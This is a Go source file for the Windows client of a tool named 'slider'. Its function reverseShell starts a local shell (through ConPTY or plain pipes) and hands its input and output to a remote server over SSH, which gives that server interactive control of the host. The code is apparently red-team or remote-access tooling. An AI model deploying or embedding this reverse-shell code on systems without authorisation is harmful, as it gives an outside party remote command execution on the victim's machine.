//go:build windows

package client

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/UserExistsError/conpty"
	"io"
	"os/exec"
	"slider/pkg/interpreter"

	"golang.org/x/crypto/ssh"
)

func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) error {
	stdin, stdinErr := sshSession.StdinPipe()
	if stdinErr != nil {
		c.Printf("session.StdinPipe: %s", stdinErr)
	}
	defer func() {
		_ = stdin.Close()
	}()
	stdout, stdoutErr := sshSession.StdoutPipe()
	if stdoutErr != nil {
		c.Printf("session.StdoutPipe: %s", stdoutErr)
	}

	cmd := exec.Command(c.interpreter.Shell, c.interpreter.ShellArgs...) //nolint:gosec

	if c.interpreter.PtyOn {
		// Request Server Terminal Size
		_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
		if reqErr != nil {
			return reqErr
		}
		var termSize interpreter.TermSize
		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
			// If error term initializes with size 0 0
			c.Errorf("%s", unMarshalErr)
		}

		// Notify server we will be sending a PTY
		errSSHReq := c.sendSessionRequest(sshSession, "pty-req", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("pty-req %s", errSSHReq)
		}

		c.interpreter.Pty, _ = conpty.Start(c.interpreter.Shell, conpty.ConPtyDimensions(termSize.Cols, termSize.Rows))
		defer func() { _ = c.interpreter.Pty.Close() }()

		// Notify server we will send a Reverse Shell
		errSSHReq = c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("reverse-shell %s", errSSHReq)
		}

		go func() { _, _ = io.Copy(c.interpreter.Pty, stdout) }()
		go func() { _, _ = io.Copy(stdin, c.interpreter.Pty) }()

		// Reply Server we are good to go
		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))

		if code, err := c.interpreter.Pty.Wait(context.Background()); err != nil {
			return fmt.Errorf("failed to spawn conpty with exit code %d", code)
		}
	} else {
		// - You are here cause the System is likely Windows < 2018 and does not support ConPTY
		// - Command Prompt Buffer Size can be set running: `mode con:cols=X lines=Y`,
		//   unfortunately there's no equivalent variable to set that up,
		//   so size won't be set or updated

		// Pipe requirement on Windows
		rp, wp := io.Pipe()
		go func() {
			_, _ = io.Copy(wp, stdout)
			c.Debugf("out finish")
		}()

		cmd.Stdout = stdin
		cmd.Stdin = rp
		cmd.Stderr = stdin

		// Reply Server we are good to go
		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))

		if runErr := cmd.Run(); runErr != nil {
			return runErr
		}
	}

	return nil
}
